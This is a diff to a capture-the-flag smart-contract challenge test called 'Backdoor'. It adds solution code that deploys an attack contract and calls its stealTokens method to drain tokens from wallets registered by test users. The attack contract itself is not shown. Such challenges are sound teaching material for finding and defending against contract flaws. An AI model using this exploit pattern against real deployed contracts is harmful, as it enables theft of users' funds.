@@ -37,6 +37,19 @@ describe('[Challenge] Backdoor', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        //deploy the attack contract
+        let attackFactory =await ethers.getContractFactory('WalletRegistryAttack', attacker)
+        let walletRegistryAttack = await attackFactory.deploy(
+            this.walletFactory.address,
+            this.walletRegistry.address,
+            this.token.address,
+            this.masterCopy.address
+        );
+
+        //call the stealTokens method on the contract. See the WalletRegistry.sol contract for more information
+        await walletRegistryAttack.stealTokens(users)
+
     });
 
     after(async function () {
